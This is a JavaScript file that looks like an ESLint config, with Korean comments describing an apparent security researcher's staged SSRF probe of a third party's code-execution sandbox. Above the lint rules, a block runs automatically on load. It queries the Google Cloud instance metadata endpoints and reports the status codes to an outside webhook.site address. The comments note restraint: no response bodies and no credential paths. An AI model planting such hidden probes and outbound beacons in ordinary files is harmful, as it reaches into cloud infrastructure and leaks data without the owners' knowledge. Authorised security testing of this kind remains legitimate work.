// s4c — s4/s4b 로 "샌드박스 안에서 우리 JS 가 실행되고 아웃바운드가 열려 있다"가 확정됐다.
// 남은 질문은 하나다: **그 아웃바운드가 그들 클라우드 내부에도 닿는가.**
// 닿으면 이건 단순 유출 통로가 아니라 SSRF 다.
//
// ── 스스로 그은 선 (보고서에도 그대로 쓴다) ──────────────────────────────
//  * 수신처는 제3자 서비스다. 그래서 **응답 본문을 절대 전송하지 않는다.**
//    보내는 것은 HTTP 상태 코드와 content-type 뿐이다.
//  * 자격증명이 반환되는 경로(`/service-accounts/...`)는 **요청하지 않는다.**
//    도달 가능성은 인스턴스 메타데이터 목록 경로만으로 충분히 증명된다.
//  * 내부 네트워크 스캔을 하지 않는다. 표준 메타데이터 주소 2개만 시도한다.
//  * 대조군으로 외부 공개 주소 1개를 같이 본다(일반 이그레스와 구분하기 위해).
const M = 'CRMARK-06fef04be9dc';

// 상태 코드만 꺼낸다. res.text()/res.json() 은 호출하지 않는다.
async function statusOf(url, headers) {
  try {
    const res = await fetch(url, { headers, redirect: 'manual' });
    return res.status + ':' + (res.headers.get('content-type') || '-').split(';')[0];
  } catch (e) {
    return 'err:' + String(e && e.message ? e.message : e).slice(0, 60);
  }
}

const GOOG = { 'Metadata-Flavor': 'Google' };

(async () => {
  const out = {};
  out.meta_ip = await statusOf('http://169.254.169.254/computeMetadata/v1/instance/', GOOG);
  out.meta_dns = await statusOf('http://metadata.google.internal/computeMetadata/v1/instance/', GOOG);
  out.ext_ctrl = await statusOf('https://example.com/', {});
  const q = Object.keys(out).map((k) => k + '=' + encodeURIComponent(out[k])).join('&');
  try { await fetch('https://webhook.site/b237c48c-bf1b-481d-b0fa-8476674f885c/s4c-reach?m=' + M + '&' + q); } catch (e) { /* 무시 */ }
})().catch(() => {});

export default [
  { files: ['**/*.js', '**/*.mjs'], rules: { 'no-unused-vars': 'warn' } },
];
